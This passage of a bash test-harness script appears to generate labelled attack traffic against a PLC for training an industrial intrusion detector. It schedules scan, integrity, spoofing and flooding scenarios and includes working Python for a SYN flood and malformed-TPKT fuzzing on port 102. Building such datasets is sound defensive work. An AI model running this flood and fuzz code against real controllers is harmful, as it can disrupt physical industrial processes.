            s.connect((TARGET, 102))
            s.close()
        except Exception: pass
        if RATE == "slow": time.sleep(random.uniform(0.2, 0.8))
        elif RATE == "ood": time.sleep(random.uniform(1.0, 3.0))

print(f"[SYN_FLOOD] {N_THR} threads rate={RATE}", flush=True)
ts = [threading.Thread(target=worker, daemon=True) for _ in range(N_THR)]
for t in ts: t.start()
while True: time.sleep(1)
PYEOF
            ;;

        PROTOCOL_FUZZ)
"$PY_CMD" -u - <<PYEOF &
import os, random, socket, time
$SRC_BIND_PREAMBLE

TARGET="$TARGET_IP"; RATE="$rate"
SLEEP = {"slow": (2.0, 8.0), "normal": (0.1, 0.5), "fast": (0.02, 0.15), "ood": (10.0, 20.0)}[RATE]
n = 0
print(f"[FUZZ] malformed TPKT payloads rate={RATE}", flush=True)
while True:
    try:
        payload = os.urandom(random.randint(12, 80))
        pkt = b"\x03\x00" + (len(payload) + 4).to_bytes(2, "big") + payload
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0); s.connect((TARGET, 102))
        s.sendall(pkt); s.close()
        n += 1
        if n % 50 == 0: print(f"[FUZZ] {n} packets rate={RATE}", flush=True)
    except Exception: pass
    time.sleep(random.uniform(*SLEEP))
PYEOF
            ;;

        *)
            log "[ERROR] Unknown scenario: $scenario"
            return 1
            ;;
    esac
    ATTACK_PID="$!"
    ALL_PIDS+=("$ATTACK_PID")
}

# =============================================================================
#  EPISODE RUNNER
# =============================================================================

# Kịch bản cần restore PLC sau khi chạy xong
needs_restore() {
    case "$1" in
        RWRITE_BURST|SETPOINT_ATTACK|SENSOR_SPOOF|STEALTHY_WRITE) return 0 ;;
        *) return 1 ;;
    esac
}

run_episode() {
    local scenario="$1"
    local rate="$2"
    local rep="$3"
    local duration_s="$4"
    local ep
    ep="$(ep_id "$scenario" "$rate" "$rep")"

    label "$scenario" "START" "$ep" "rate=$rate rep=$rep dur=${duration_s}s"
    start_attack "$scenario" "$rate" "$ep"
    local pid="$ATTACK_PID"

    wait_s "$duration_s" "$scenario/$rate r$rep"
    stop_pid "$pid"

    if needs_restore "$scenario"; then
        restore_plc
    fi

    label "$scenario" "END" "$ep" "rate=$rate rep=$rep"
    sleep 2
}

episode_gap() {
    label "BENIGN_NORMAL" "START" "${SESSION_ID}:day${DAY}:BENIGN:gap" "inter-episode"
    wait_s "$EPISODE_GAP" "inter-episode gap"
    label "BENIGN_NORMAL" "END"   "${SESSION_ID}:day${DAY}:BENIGN:gap" ""
}

# Xoay vòng slow/normal/fast qua N lần lặp (N > 3 với extended_300k)
rate_for_rep() {
    local rates=(slow normal fast)
    echo "${rates[$(( ($1 - 1) % 3 ))]}"
}

# Xáo trộn thứ tự danh sách kịch bản — dùng để mỗi rep trong ngày không luôn
# chạy đúng 1 thứ tự cố định (tránh model học "hễ hết A là tới B" thay vì học
# đặc trưng riêng của từng kịch bản).
shuffle_list() {
    "$PY_CMD" -c "import random,sys; s=sys.argv[1].split(); random.shuffle(s); print(' '.join(s))" "$1"
}

# =============================================================================
#  LỊCH 6 NGÀY
# =============================================================================

run_day1() {
    log "=== DAY 1: BENIGN BASELINE === (${D1_DUR}s)"
    label "BENIGN_NORMAL" "START" "${SESSION_ID}:day1:BENIGN:full" "pure benign all profiles"
    wait_s "$D1_DUR" "day1 benign"
    label "BENIGN_NORMAL" "END"   "${SESSION_ID}:day1:BENIGN:full" ""
}

# Vòng lặp episode chạy tới khi hết deadline_ms thay vì dừng ở số rep cố định.
# REPS_DAYx giờ chỉ còn là NGƯỠNG AN TOÀN tối đa (chặn vòng lặp vô hạn nếu
# lỡ cấu hình DUR/GAP = 0), số rep thật do D*_DUR quyết định — rate vẫn xoay
# vòng slow/normal/fast nên các rate lặp lại nhiều lần khi ngày chạy đủ dài.
REP_SAFETY_MULT="${REP_SAFETY_MULT:-20}"

run_day2() {
    log "=== DAY 2: RECONNAISSANCE === (target ${D2_DUR}s, rate xoay vòng slow/normal/fast, thứ tự xáo trộn mỗi rep)"
    wait_s "$WARMUP_S" "warmup"
    local deadline_ms=$(( $(now_ms) + (D2_DUR - WARMUP_S - COOLDOWN_S) * 1000 ))
    local rep_cap=$(( REPS_DAY2 * REP_SAFETY_MULT ))
    local rep=1 rate order scenario
    while [[ "$(now_ms)" -lt "$deadline_ms" && "$rep" -le "$rep_cap" ]]; do
        rate="$(rate_for_rep "$rep")"
        order="$(shuffle_list "SCAN_PORT ENUM_TAGS")"
        for scenario in $order; do
            [[ "$(now_ms)" -ge "$deadline_ms" ]] && break 2
            case "$scenario" in
                SCAN_PORT) run_episode "SCAN_PORT" "$rate" "$rep" "$DUR_SLOW" ;;   # SCAN không cần dài
                ENUM_TAGS) run_episode "ENUM_TAGS" "$rate" "$rep" "$DUR_NORMAL" ;;
            esac
            episode_gap
        done
        rep=$((rep + 1))
    done
    log "[day2] hoàn tất ${rep} rep(s)"
    wait_s "$COOLDOWN_S" "cooldown"
}

run_day3() {
    log "=== DAY 3: INTEGRITY PART 1 (RWRITE + SETPOINT) === (target ${D3_DUR}s, rate xoay vòng slow/normal/fast, thứ tự xáo trộn mỗi rep)"
    wait_s "$WARMUP_S" "warmup"
    local deadline_ms=$(( $(now_ms) + (D3_DUR - WARMUP_S - COOLDOWN_S) * 1000 ))
    local rep_cap=$(( REPS_DAY3 * REP_SAFETY_MULT ))
    local rep=1 rate order scenario
    while [[ "$(now_ms)" -lt "$deadline_ms" && "$rep" -le "$rep_cap" ]]; do
        rate="$(rate_for_rep "$rep")"
        order="$(shuffle_list "RWRITE_BURST SETPOINT_ATTACK")"
        for scenario in $order; do
            [[ "$(now_ms)" -ge "$deadline_ms" ]] && break 2
            run_episode "$scenario" "$rate" "$rep" "$DUR_NORMAL"
            episode_gap
        done
        rep=$((rep + 1))
    done
    log "[day3] hoàn tất ${rep} rep(s)"
    wait_s "$COOLDOWN_S" "cooldown"
}

run_day4() {
    log "=== DAY 4: INTEGRITY PART 2 (SPOOF + STEALTHY) === (target ${D4_DUR}s, rate xoay vòng slow/normal/fast, thứ tự xáo trộn mỗi rep)"
    wait_s "$WARMUP_S" "warmup"
    local deadline_ms=$(( $(now_ms) + (D4_DUR - WARMUP_S - COOLDOWN_S) * 1000 ))
    local rep_cap=$(( REPS_DAY4 * REP_SAFETY_MULT ))
    local rep=1 rate order scenario
    while [[ "$(now_ms)" -lt "$deadline_ms" && "$rep" -le "$rep_cap" ]]; do
        rate="$(rate_for_rep "$rep")"
        order="$(shuffle_list "SENSOR_SPOOF STEALTHY_WRITE")"
        for scenario in $order; do
            [[ "$(now_ms)" -ge "$deadline_ms" ]] && break 2
            case "$scenario" in
                SENSOR_SPOOF)   run_episode "SENSOR_SPOOF"   "$rate" "$rep" "$DUR_NORMAL" ;;
                STEALTHY_WRITE) run_episode "STEALTHY_WRITE" "$rate" "$rep" "$DUR_STEALTHY_NORMAL" ;;
            esac
            episode_gap
        done
        rep=$((rep + 1))
    done
    log "[day4] hoàn tất ${rep} rep(s)"
    wait_s "$COOLDOWN_S" "cooldown"
}

run_day5() {
    log "=== DAY 5: AVAILABILITY (S7_FLOOD + SYN_FLOOD + FUZZ) === (target ${D5_DUR}s, rate xoay vòng slow/normal/fast, thứ tự xáo trộn mỗi rep)"
    wait_s "$WARMUP_S" "warmup"
    local deadline_ms=$(( $(now_ms) + (D5_DUR - WARMUP_S - COOLDOWN_S) * 1000 ))
    local rep_cap=$(( REPS_DAY5 * REP_SAFETY_MULT ))
    local rep=1 rate order scenario
    while [[ "$(now_ms)" -lt "$deadline_ms" && "$rep" -le "$rep_cap" ]]; do
        rate="$(rate_for_rep "$rep")"
        order="$(shuffle_list "S7_FLOOD SYN_FLOOD PROTOCOL_FUZZ")"
        for scenario in $order; do
            [[ "$(now_ms)" -ge "$deadline_ms" ]] && break 2
            case "$scenario" in
                S7_FLOOD|SYN_FLOOD) run_episode "$scenario" "$rate" "$rep" "$DUR_SLOW" ;;
                PROTOCOL_FUZZ)      run_episode "$scenario" "$rate" "$rep" "$DUR_NORMAL" ;;
            esac
            episode_gap
        done
        rep=$((rep + 1))
    done
    log "[day5] hoàn tất ${rep} rep(s)"
    wait_s "$COOLDOWN_S" "cooldown"
}

# Thời lượng episode Day 6 theo nhóm kịch bản (recon nhanh hơn scan/enum,
# availability nên ngắn hơn để không đè PLC lâu, integrity ở giữa)
day6_duration_for() {
    case "$1" in
        SCAN_PORT|ENUM_TAGS)
            rand_range "$DAY6_SCANENUM_MIN" "$DAY6_SCANENUM_MAX" ;;
        RWRITE_BURST|SETPOINT_ATTACK|SENSOR_SPOOF|STEALTHY_WRITE)
            rand_range "$DAY6_INTEGRITY_MIN" "$DAY6_INTEGRITY_MAX" ;;
        S7_FLOOD|SYN_FLOOD|PROTOCOL_FUZZ)
            rand_range "$DAY6_AVAIL_MIN" "$DAY6_AVAIL_MAX" ;;
        *)
            rand_range "$DAY6_SCANENUM_MIN" "$DAY6_SCANENUM_MAX" ;;
    esac
}

day6_gap() { rand_range "$DAY6_GAP_MIN" "$DAY6_GAP_MAX"; }

run_day6() {
    log "=== DAY 6: OOD ROBUSTNESS HOLDOUT === (target ${D6_DUR}s, min ${DAY6_CYCLES} cycle(s), rate=ood — nằm ngoài slow/normal/fast đã train Day 2-5)"
    # Mỗi cycle: shuffle lại thứ tự 9 kịch bản, rate thấp hơn, gap ngẫu nhiên rộng hơn
    local all_scenarios="SCAN_PORT ENUM_TAGS RWRITE_BURST SETPOINT_ATTACK SENSOR_SPOOF STEALTHY_WRITE S7_FLOOD SYN_FLOOD PROTOCOL_FUZZ"
    wait_s "$WARMUP_S" "warmup"
    local deadline_ms=$(( $(now_ms) + (D6_DUR - WARMUP_S - COOLDOWN_S) * 1000 ))
    local cycle_cap=$(( DAY6_CYCLES * REP_SAFETY_MULT ))
    local idx=1 cycle=1 shuffled scenario dur gap
    # Chạy tối thiểu DAY6_CYCLES chu kỳ, sau đó tiếp tục chu kỳ mới nếu vẫn còn
    # thời gian tới deadline (để D6_DUR thật sự quyết định tổng thời lượng).
    while [[ "$cycle" -le "$DAY6_CYCLES" || "$(now_ms)" -lt "$deadline_ms" ]]; do
        [[ "$cycle" -gt "$cycle_cap" ]] && break
        shuffled=$("$PY_CMD" -c "import random,sys; s=sys.argv[1].split(); random.shuffle(s); print(' '.join(s))" "$all_scenarios")
        log "[day6] cycle ${cycle}: $shuffled"
        for scenario in $shuffled; do
            dur="$(day6_duration_for "$scenario")"
            run_episode "$scenario" "ood" "$idx" "$dur"
            gap="$(day6_gap)"
            label "BENIGN_NORMAL" "START" "${SESSION_ID}:day6:BENIGN:gap${idx}" "ood_gap=${gap}s"
            wait_s "$gap" "ood gap $idx"
            label "BENIGN_NORMAL" "END"   "${SESSION_ID}:day6:BENIGN:gap${idx}" ""
            idx=$((idx + 1))
            [[ "$cycle" -ge "$DAY6_CYCLES" && "$(now_ms)" -ge "$deadline_ms" ]] && break
        done
        cycle=$((cycle + 1))
    done
    log "[day6] hoàn tất $((cycle - 1)) cycle(s)"
    wait_s "$COOLDOWN_S" "cooldown"
}

# =============================================================================
#  MAIN
# =============================================================================

echo ""
echo "============================================================"
echo " run_combined_day.sh — Day $DAY  Session=$SESSION_ID"
echo " Target: $TARGET_IP rack=$RACK slot=$SLOT"
echo " Profile: $PROFILE"
echo " Output:  PCAP=$CAPTURE_DIR  Tags=$LOG_DIR  Labels=$LABEL_DIR"
echo "============================================================"
echo ""

preflight || { log "[ERROR] Preflight failed. Check PLC connection."; exit 2; }

start_capture
start_tag_logger    # Khởi động TRƯỚC, warmup 5s bên trong hàm
start_hmi_diverse   # Khởi động HMI đa dạng

log "[main] All background services running. Starting Day $DAY schedule..."

case "$DAY" in
    1) run_day1 ;;
    2) run_day2 ;;
    3) run_day3 ;;
    4) run_day4 ;;
    5) run_day5 ;;
    6) run_day6 ;;
esac

log "[main] Day $DAY COMPLETE."
echo ""
echo "Files saved:"
echo "  PCAP  : $CAPTURE_DIR/${SESSION_ID}.pcapng"
echo "  Tags  : $LOG_DIR/${SESSION_ID}_tags.csv"
echo "  Labels: $LABEL_CSV_PATH"
echo "  Events: $ATTACK_EVENT_FILE"
